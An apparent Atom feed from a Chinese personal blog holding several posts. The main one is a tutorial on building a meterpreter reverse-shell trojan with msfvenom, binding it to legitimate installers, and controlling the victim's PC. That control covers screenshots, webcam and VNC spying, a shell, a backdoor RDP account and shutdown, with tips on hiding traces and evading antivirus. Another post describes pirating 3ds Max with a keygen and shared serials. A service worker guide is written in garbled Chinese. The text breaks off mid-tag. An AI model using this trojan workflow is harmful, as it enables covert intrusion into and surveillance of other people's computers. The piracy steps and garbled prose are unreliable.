@@ -1,0 +1,245 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Hi, Lovely god</title>
+  
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://lovek.me/"/>
+  <updated>2020-01-19T16:32:36.809Z</updated>
+  <id>http://lovek.me/</id>
+  
+  <author>
+    <name>Lovely God</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>100天成就达成！</title>
+    <link href="http://lovek.me/av8/"/>
+    <id>http://lovek.me/av8/</id>
+    <published>2019-12-24T11:11:00.000Z</published>
+    <updated>2020-01-19T16:32:36.809Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/12/25/lizQyQ.jpg" alt="Hi，Lovely God"></p><ul><li>正好赶上今年的平安夜，提前祝大家圣诞节快乐哦！(๑•̀ㅂ•́)و✧<a id="more"></a><img src="https://s2.ax1x.com/2019/12/25/lizMQg.jpg" alt="Hi，Lovely God"></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/25/lizQyQ.jpg&quot; alt=&quot;Hi，Lovely God&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;正好赶上今年的平安夜，提前祝大家圣诞节快乐哦！(๑•̀ㅂ•́)و✧
+    
+    </summary>
+    
+    
+      <category term="日记本" scheme="http://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Kali Linux利用metasploit生成木马实现入侵Windows系统</title>
+    <link href="http://lovek.me/av7/"/>
+    <id>http://lovek.me/av7/</id>
+    <published>2019-12-12T15:47:00.000Z</published>
+    <updated>2020-01-19T16:29:33.593Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。</p></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>入侵机器：Kali Linux 2019.4 64位<br>肉鸡：Windows 7 64位</p><a id="more"></a><h2 id="本机IP"><a href="#本机IP" class="headerlink" title="本机IP"></a>本机IP</h2><p>首先我们来看一下入侵机器的IP地址.<br>终端输入：ifconfig</p><p><img src="https://s2.ax1x.com/2019/12/25/lijmJU.png" alt="Lovely God"></p><ul><li>图中红色方框内就是我们的入侵机器的IP了，下面会用到。</li></ul><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>终端输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.140 LPORT=4444 -f exe -o God.exe</p><p><img src="https://s2.ax1x.com/2019/12/25/lijnWF.png" alt="Lovely God"></p><p>参数解释：</p><ul><li><p>-p:指定payload</p></li><li><p>LHOST:本机IP （这里入侵机器的IP为：”192.168.211.140”，根据使用ifconfig命令得出的IP地址自行更改）</p></li><li><p>LPORT:指定监听端口  (这里指定的监听端口为：4444)</p></li><li><p>-f:指定文件类型</p></li><li><p>-o:指定输出的木马文件名  (这里木马名叫做God，可随意更改)</p></li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lijQy9.png" alt="Lovely God"></p><ul><li>命令执行完毕后我们root目录下会生成一个名为God的exe程序文件，可想而知，这个便就是我们的木马文件了。</li></ul><h2 id="msfconsole监听"><a href="#msfconsole监听" class="headerlink" title="msfconsole监听"></a>msfconsole监听</h2><ol><li><p>终端输入：msfconsole</p></li><li><p>使用监听模块：use exploit/multi/handler</p></li><li><p>设置payload：set payload windows/meterpreter/reverse_tcp</p></li><li><p>设置入侵机kali linux的IP地址：set lhost 192.168.96.128 （ip要与生成木马时的ip一致）</p></li><li><p>设置监听端口：set lport 4444 (端口要与生成木马时的端口一致）</p></li></ol><p><img src="https://s2.ax1x.com/2019/12/25/lij3e1.png" alt="Lovely God"></p><ol start="6"><li>开始监听：exploit</li></ol><p><img src="https://s2.ax1x.com/2019/12/25/lij8dx.png" alt="Lovely God"></p><h2 id="肉鸡安装木马"><a href="#肉鸡安装木马" class="headerlink" title="肉鸡安装木马"></a>肉鸡安装木马</h2><ul><li>把刚刚生成的木马文件放到我们的肉鸡当中，可以使用捆绑软件将木马文件和我们的正常程序文件捆绑在一起，下面我们把刚刚生成的木马文件和360安全卫士捆绑在一起，因为没有做免杀360安全卫士报毒了，需要免杀的大神可自行研究。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lijGo6.png" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/lijYFK.png" alt="Lovely God"></p><ul><li>如果肉鸡是普通用户的电脑并且没有安装杀毒软件或是忽略了杀毒软件的提示的话，点开了被我们木马感染的应用程序，运行了正常应用程序的同时也运行了我们的木马文件，在不知不觉间就成为了我们的囊中之物。</li></ul><h2 id="控制肉鸡"><a href="#控制肉鸡" class="headerlink" title="控制肉鸡"></a>控制肉鸡</h2><p>如果肉鸡成功的运行了我们的木马文件并且我们入侵机Kali Linux在监听状态下的话，入侵机就会产生一个meterpreter会话，参考下图</p><p><img src="https://s2.ax1x.com/2019/12/25/lijtJO.png" alt="Lovely God"></p><p>这时我们就可以对肉鸡进行控制了</p><ol><li>终端输入 sysinfo 可以获取到肉鸡的基本信息</li></ol><p><img src="https://s2.ax1x.com/2019/12/25/lijaSe.png" alt="Lovely God"></p><ol start="2"><li>终端输入 screenshot 可以获取到肉鸡屏幕的截图，截图默认保存在root文件夹当中</li></ol><p><img src="https://s2.ax1x.com/2019/12/25/lijdQH.png" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/lijwyd.png" alt="Lovely God"></p><ol start="3"><li>终端输入 webcam_list 可以查看肉鸡有几个摄像头，如果肉鸡有摄像头的话终端输入 webcam_stream 可以获取到肉鸡摄像头视频</li></ol><p><img src="https://s2.ax1x.com/2019/12/25/lij0OA.png" alt="Lovely God"></p><ul><li>由于这里的肉鸡是windons 7，没有摄像头，所以这里无法演示。</li></ul><p> 4.终端输入 dir 可以查看肉鸡上的文件</p><p><img src="https://s2.ax1x.com/2019/12/25/lijDeI.png" alt="Lovely God"></p><ul><li>因为木马程序的位置是在桌面，所以获取到了桌面下的所有文件。</li></ul><p> 5.我们可以在肉鸡上启动某个程序，命令为 execute ，比如启动肉鸡上的计算器，终端输入 execute -f calc.exe ，回到肉鸡中，计算器已被启动</p><p><img src="https://s2.ax1x.com/2019/12/25/lijrwt.png" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/lixsG8.png" alt="Lovely God"></p><p> 6.终端输入 run vnc 可查看肉鸡的实时屏幕，并且被监视的肉鸡本身并不会发生任何变化，不知不觉间就被我们监视了</p><p><img src="https://s2.ax1x.com/2019/12/25/lixBIP.png" alt="Lovely God"></p><p> 7.终端输入 shell 可以进入肉鸡的命令行，这里你可在对方的电脑上执行一些cmd命令，当然，我们的一系列操作普通用户是看不到的，命令行输入 ipconfig 查看一下肉鸡的IP，下面会用到。</p><p><img src="https://s2.ax1x.com/2019/12/25/lixrPf.png" alt="Lovely God"></p><p> 8.终端输入 ps 可以看到肉鸡当前正在运行的程序，你可以用 run post/windows/manage/migrate 将进程迁移到其他程序，也可以将其他程序关闭</p><p><img src="https://s2.ax1x.com/2019/12/25/liXvIf.png" alt="Lovely God"></p><p> 9.进入肉鸡的远程桌面，实现远程控制，首先开启肉鸡的3389远程桌面，终端输入 run getgui -e 即可开启</p><p><img src="https://s2.ax1x.com/2019/12/25/liXjdP.png" alt="Lovely God"></p><p> 10.成功开启了肉鸡的3389远程桌面后我们在肉鸡上新建一个用来登陆远程桌面的帐户，终端输入 run getgui -u God -p 123456</p><p><img src="https://s2.ax1x.com/2019/12/25/liXzi8.png" alt="Lovely God"></p><ul><li>这里新建了一个用户名为 God ，密码为 123456 的帐户</li></ul><p> 11.我们新建一个终端窗口，终端输入 rdesktop -u God -p 123456 192.168.211.132:3389 登录肉鸡远程桌面。命令中的God为刚刚创建的登录用户名，123456为刚刚创建的登录密码，192.168.96.129为肉鸡的IP地址，根据自己创建的帐户和肉鸡的IP自行更改</p><p><img src="https://s2.ax1x.com/2019/12/25/lij9zQ.png" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/lijPMj.png" alt="Lovely God"></p><p>这个时候就可以像操作自己电脑一样操控肉鸡，你可以利用他做任何你想要做事情，如果做什么特殊的事情切记要记得清理一下入侵痕迹并且做好防御防止自己被反追踪，具体如何防御我就不细说了，这里只讲入侵，其余的请自行百度解决。</p><p> 12.终端输入输入 shutdown 可以强制将肉鸡电脑关机</p><p><img src="https://s2.ax1x.com/2019/12/25/lijFLn.png" alt="Lovely God"></p><ul><li>回到肉鸡中可以看到肉鸡关机了</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lijEd0.png" alt="Lovely God"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>metasploit这个渗透框架功能十分强大，这里只讲述了部分常用功能，更多的功能你们可以自行尝试。</li><li>这里不足之处就是这个木马不能免杀，安装有腾讯安全卫士或者360安全卫士的电脑能立马查杀出来。当然还有其他的免杀方式，或者也可以用powershell来达到免杀效果，杀毒软件一般是无法查杀的。</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;写在前面：此木马试了很多方法都还是会被360安全卫士、腾讯安全管家等杀毒软件查杀，所以本文的木马不具备免杀功能，大神可自行研究。本文仅供参考学习，请勿用做非法用途，造成的一切后果自行承担。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;准备环境&quot;&gt;&lt;a href=&quot;#准备环境&quot; class=&quot;headerlink&quot; title=&quot;准备环境&quot;&gt;&lt;/a&gt;准备环境&lt;/h2&gt;&lt;p&gt;入侵机器：Kali Linux 2019.4 64位&lt;br&gt;肉鸡：Windows 7 64位&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="创作集" scheme="http://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>应用Service worker完成加快/离线访问博客</title>
+    <link href="http://lovek.me/av6/"/>
+    <id>http://lovek.me/av6/</id>
+    <published>2019-12-01T11:23:00.000Z</published>
+    <updated>2020-01-19T16:25:36.029Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/12/25/lizoTI.png" alt="Service worker"></p><p>有一个困扰 web 用户多年的困难——丧失网页持续。即便是世界上最佳的 web app，要是下载不了它，也短长常倒霉的体验。现在固然曾经有许多种技术去测试着办理这一问题。而跟着<strong>离线页面</strong>的出现，少许问题曾经得到打听决。有一个叫做 APP Cache 的 API 能够供应离线体验，但它的问题对照多。最紧张的问题是，仍旧没有一个好的统筹机制对资源缓存和自界说的网页要求举行掌握。</p><a id="more"></a><h2 id="Service-worker"><a href="#Service-worker" class="headerlink" title="Service worker"></a>Service worker</h2><p>因而 HTML5 提出了 Service Worker，Service worker 供应了许多新的才气，使得 web app 领有与 nativeapp 相像的离线体验、动静推送体验。</p><p>Service worker 是一段剧本，它有才气往我们的涉猎器中写入缓存，过滤网页要求，将缓存内容作为网页相应后果输出。<br><strong>带来的结果是显而易见的：</strong></p><blockquote><p>1、当我们缓存了某些资源的时分，当我们再次要求该资源的时分，我们便能够应用缓存的内容，如许的话，便削减网页要求了，网站的翻开速度明显提升。<br>2、要是我们将网站所需的资源缓存下来了往后，这个时分即便计算机没有网页，仍然能够翻开这个网站，即离线走访。</p></blockquote><h2 id="Service-worker-应用场景"><a href="#Service-worker-应用场景" class="headerlink" title="Service worker 应用场景"></a>Service worker 应用场景</h2><p>现在很盛行基于 GitHub page 和 markdown 的静态 blog ，最适用技术的思维和习气，针对差别的说话都有少许先进的静态 blog 体系出现，如 Jekyll/Ruby，Pelican/Python，Hexo/NodeJs ，由于静态内容的特征最适用做缓存来加速页面的走访，就行使 Service worker 来完成加速，后果是除了 PageSpeed，CDN 这些多见的服务器和网页加速以外，通过客户端完成了更好的走访体验。</p><p>现在你可以试试<strong>剪断网线</strong>刷新一下这个可爱的博客。或浏览器快捷键F12—&gt;点击Network—&gt;选择offline</p><h2 id="应用技巧"><a href="#应用技巧" class="headerlink" title="应用技巧"></a>应用技巧</h2><p><strong>注册 Service worker</strong><br>要安置 Service worker，你需求在你的页面上注册它。下面的代码会报告涉猎器你的 Service worker 剧本放在哪里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">if</span> (navigator.serviceWorker) &#123;</span><br><span class="line">    <span class="comment">// 注册Service Worker scope表示作用的页面的path</span></span><br><span class="line">    <span class="comment">// register函数返回Promise</span></span><br><span class="line">    navigator.serviceWorker.register(<span class="string">'/service-worker.js'</span>,&#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;) </span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span> (<span class="params">registration</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(registration);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(e);</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Service Worker is not supported in this browser.'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码会先检验 Service worker 在浏览器中是否可用，可用的话一个 Service worker（/service-worker.js）将被注册，要是这个 Service worker 已经注册过了，浏览器这会纰漏以上代码。<br><strong>{scope: ‘/‘}</strong> 显露 Service worker 用途的局限。<br>需要分析的是 service-worker.js 文件被放在这个域的根目次下，这意味着 service worker 是跟网站同源的。换句话说，这个 service worker 将会获得到这个域下的全部 fetch 事务。<br>要是 service worker 文件注册到 /example/service-worker.js ，那么 service worker 只能收到 /example/ 途径下的 fetch 事务（好比： /example/page1/, /example/page2/）。<br>要是 service worker 文件注册到根目次下 /service-worker.js ，同时 {scope: ‘/example’} ，那么 service worker 也只能收到 /example/ 途径下的 fetch 事务。</p><p>service-worker.js 文件，我发起是放在网站的跟目录下，scope 不做更改，这样 service worker 领有非常大的应用局限。</p><h2 id="安装-Service-worker"><a href="#安装-Service-worker" class="headerlink" title="安装 Service worker"></a>安装 Service worker</h2><p><img src="https://s2.ax1x.com/2019/12/25/liX158.png" alt="Service worker"></p><p>对于这个 service-worker.js 奈何写，详细可以稽查 API ，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">MDN Service Worker API</a>。</p><blockquote><p>留意：将 service-worker.js 放到域的根目次下哦，这样 Service worker 才能领有非常大的应用局限。</p></blockquote><p>当今你可以到 chrome://inspect/#service-workers 这里，搜检 service worker 是否对你的网站启用了。<br>大概在 chrome://serviceworker-internals/ 中经管你的 Service worker 。<br>大概在涉猎器的开发者对象中也能够细致的查看 service worker 的缓存。</p><p><img src="https://s2.ax1x.com/2019/12/25/liXlUf.png" alt="service worker"></p><h2 id="Service-worker-核心-API"><a href="#Service-worker-核心-API" class="headerlink" title="Service worker 核心 API"></a>Service worker 核心 API</h2><p><img src="https://s2.ax1x.com/2019/12/25/liXKbt.png" alt="Service worker 核心 API"></p><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><img src="https://s2.ax1x.com/2019/12/25/liXQVP.png" alt="install"></p><p>install 是安置一个 service worker 缓存，应用技巧能够是这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the callback for the install step</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Perform install steps</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在 install 的 callback 中，我们需求执行一下步调：<br>1、开启一个缓存<br>2、缓存我们的文件<br>3、断定全部的资源是否要被缓存</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h2><p>fetch 用来监听用户的网页请求，并给出回应。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request)</span><br><span class="line">      .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Cache hit - return response</span></span><br><span class="line">        <span class="keyword">if</span> (response) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fetch(event.request);</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="activate"><a href="#activate" class="headerlink" title="activate"></a>activate</h2><p>你的 Service worker 总会有要更新的时分。在当时，你需要根据一下步调来更新：<br>1、更新你 service worker 的 JavaScript 文件。<br>2、更新后的 service worker 启动并触发 install 事务。<br>3、此时，目前页面见效的依然是老版本的 service worker ，新的 service worker 会进入“waitting”状况。<br>4、当页面封闭后，来的 service worker 会被干掉，新的 service worker 回收页面。<br>5、一旦新的 service worker 见效后会触发 active 事务。</p><p>一个典型的 activete 事务：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123; </span><br><span class="line"><span class="comment">// 监听worker的activate事件</span></span><br><span class="line">  event.waitUntil( <span class="comment">// 延迟activate事件直到</span></span><br><span class="line">    caches.keys().then(<span class="function"><span class="keyword">function</span>(<span class="params">keys</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(keys.map(<span class="function"><span class="keyword">function</span>(<span class="params">key, i</span>)</span>&#123; <span class="comment">// 清除旧版本缓存</span></span><br><span class="line">        <span class="keyword">if</span>(key !== CACHE_VERSION)&#123;</span><br><span class="line">          <span class="keyword">return</span> caches.delete(keys[i]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;)</span><br><span class="line">  )</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="其他使用场景"><a href="#其他使用场景" class="headerlink" title="其他使用场景"></a>其他使用场景</h2><p>在网站 A 中，潜藏一个 iframe ，在这个 iframe 中注册一个 service worker ，这个 service worker 会缓存网站 B 所需的资源。<br>从未访问过网站 B，但网站曾经在你的建筑上预加载过了，一切仅仅由于你访问过网站 A。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://B.com/iframe.html"</span> <span class="attr">style</span>=<span class="string">"width: 0; height: 0; border: 0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML5 For Web Designers<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</span></span><br><span class="line"><span class="actionscript">  navigator.serviceWorker.register(<span class="string">'/serviceworker.js'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/25/lizoTI.png&quot; alt=&quot;Service worker&quot;&gt;&lt;/p&gt;
+&lt;p&gt;有一个困扰 web 用户多年的困难——丧失网页持续。即便是世界上最佳的 web app，要是下载不了它，也短长常倒霉的体验。现在固然曾经有许多种技术去测试着办理这一问题。而跟着&lt;strong&gt;离线页面&lt;/strong&gt;的出现，少许问题曾经得到打听决。有一个叫做 APP Cache 的 API 能够供应离线体验，但它的问题对照多。最紧张的问题是，仍旧没有一个好的统筹机制对资源缓存和自界说的网页要求举行掌握。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="创作集" scheme="http://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3D Max 安装</title>
+    <link href="http://lovek.me/av5/"/>
+    <id>http://lovek.me/av5/</id>
+    <published>2019-11-23T12:33:00.000Z</published>
+    <updated>2020-01-19T15:53:15.199Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="需要资源："><a href="#需要资源：" class="headerlink" title="需要资源："></a>需要资源：</h2><ul><li><strong>3D Max安装包</strong></li><li><strong>3D Max注册机</strong></li><li><strong>VRay渲染器（3D 必装）</strong> </li><li><strong>VRay破解工具</strong></li><li><strong>VRay汉化工具</strong><blockquote><p>本篇文章以<strong>2018年版</strong>的<strong>3D Max</strong>和<strong>VRay 3.6</strong>为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。</p></blockquote></li></ul><a id="more"></a><ul><li>为了方便大家不用再去网上辛苦的找资源，本篇文章底部已附上所需软件的下载地址，只适用于64位操作系统，需要的可以前往下载。</li></ul><hr><h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul><li>下载完成并解压之后得到<strong>3D Max 2018</strong>和<strong>VRay 3.6</strong>两个文件。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lihbKU.jpg" alt="Lovely God"></p><hr><h2 id="3D-Max-2018"><a href="#3D-Max-2018" class="headerlink" title="3D Max 2018"></a>3D Max 2018</h2><ul><li>首先我们先来安装3D Max 2018，吧3D Max解压到你的桌面上方便安装完成之后的整理。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lihqrF.jpg" alt="Lovely God"></p><ul><li>打开我们刚解压出来的文件夹，得到3D Max安装主程序文件夹和一个注册机文件夹，部分电脑会报毒属于正常，我们忽略掉就好。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lihLb4.jpg" alt="Lovely God"></p><ul><li>进入3D Max 2018文件夹里面有三个文件，我们先来安装一下3D Max的帮助，打开<strong>3Ds Max2018Help</strong>文件，记得要右键管理员身份运行，否则会报错。弹出图中窗口，点击那个<strong>Browse…</strong>来选择我们的安装路径，安装到你想要安装的磁盘，这里我安装到D盘。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lihXVJ.jpg" alt="Lovely God"></p><ul><li>在需要安装的磁盘里面新建一个文件夹，将它命名为<strong>3D Max2018</strong>，选择它并确定</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lihzP1.jpg" alt="Lovely God"></p><ul><li>选择好路径之后我们点击<strong>Extract</strong>开始安装，安装过程大约需要1~3分钟.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4p26.jpg" alt="Lovely God"></p><ul><li>安装完3D Max2018Help之后我们来解压3Dmax安装主程序，两个一模一样的安装包，随便打开那个都可以，切记要右键管理员方式运行，弹出图中窗口，点击”<strong>更改</strong>“选择路径.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li49xK.jpg" alt="Lovely God"></p><ul><li>在刚刚安装3D MaxHelp的那个磁盘里再新建一个文件夹，命名为<strong>3D Max</strong>安装程序，(只要自己待会能找到可以随便命名)，选择它并确定.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4PKO.jpg" alt="Lovely God"></p><ul><li>选择好路径后点击确定就会开始解压，此过程大约需要4~8分钟.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4Fqe.jpg" alt="Lovely God"></p><ul><li>解压完成之后一般会自动弹出3D Max的安装页面.</li><li>如果没弹出请依次打开：此电脑 ➡ (你安装的磁盘) ➡ 3D Max安装程序(刚刚解压时新建的文件名称) ➡ Autodesk_3ds_Max_2018_EFGJKPS_Win_64bit_dlm ➡ setup(记得右键管理员运行)</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4Ead.jpg" alt="Lovely God"></p><ul><li>选择”<strong>安装</strong>“，点击”<strong>我接受</strong>“然后下一步，进入配置页面.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4VIA.jpg" alt="Lovely God"></p><ul><li>这里点击”<strong>浏览</strong>“来选择安装路径，选择刚刚安装3D MaxHelp的那个磁盘，找到第一次新建的那个文件夹，就是名为3D Max2018的那个文件夹，选择它并确定，路径选择好之后我们直接点击安装。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4ePI.jpg" alt="Lovely God"></p><ul><li>程序会自动开始配置各种3D Max的文件，我这里是23个产品，安装的电脑不同安装的产品数量也不同，这里一般需要较长的时间，请<strong>不要中途取消</strong>，需要些耐心.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4mGt.jpg" alt="Lovely God"></p><ul><li>安装成功之后出现下图，(如果之前电脑安装过3D Max可能会出现安装错误的情况，如果出现此类情况，这里不再详细讲解，请自行百度搜索错误原因)，不要点击立即启动，我们点击右上角的”<strong>X</strong>“号将这个窗口关掉.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4uxf.jpg" alt="Lovely God"></p><ul><li>现在我们打开3D Max是英文状态，我们需要点击任务栏上面的win图标，从里面可以看到好多3D Max的图标，打开折叠，随便在一个3D Max的图标上右键➡更多➡打开文件位置.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4MM8.jpg" alt="Lovely God"></p><ul><li>在弹出的文件夹里面找到名为<strong>3ds Max 2018 - Simplified Chinese</strong>的图标，把它拖到电脑桌面上去，删除桌面上原有的3D Max图标，吧刚刚从文件夹里面拖出来的那个图标右键重命名为<strong>3D Max 2018</strong>(或者选择它点击<strong>F2</strong>重命名也可以)，至此3D Max安装完成.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4QsS.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/li4lqg.jpg" alt="Lovely God"></p><hr><h2 id="3D-Max破解"><a href="#3D-Max破解" class="headerlink" title="3D Max破解"></a>3D Max破解</h2><ul><li>打开注册机文件夹，把里面的注册机拖到桌面上，然后我们打开3D Max 2018.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li43ZQ.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/li48aj.jpg" alt="Lovely God"></p><ul><li>加载一会自动弹出下图激活窗口，我们选择输入序列号.(网上说这里要断网才能激活，经过测试这里并不需要断网，都是可以激活的)</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4GIs.jpg" alt="Lovely God"></p><ul><li>这里点击激活按钮，不要点错了，如果点错了可以重新启动3D Max重新选择.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4Yin.jpg" alt="Lovely God"></p><ul><li>这里填写序列号和产品密钥，分享大家一个序列号：<strong>666-69696969</strong> 产品密钥：<strong>128J1</strong>(序列号和产品密钥可多次使用，不用担心用不了，并且都是永久激活)</li><li>填写完整序列号和产品密钥之后我们点击下一步即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4NR0.jpg" alt="Lovely 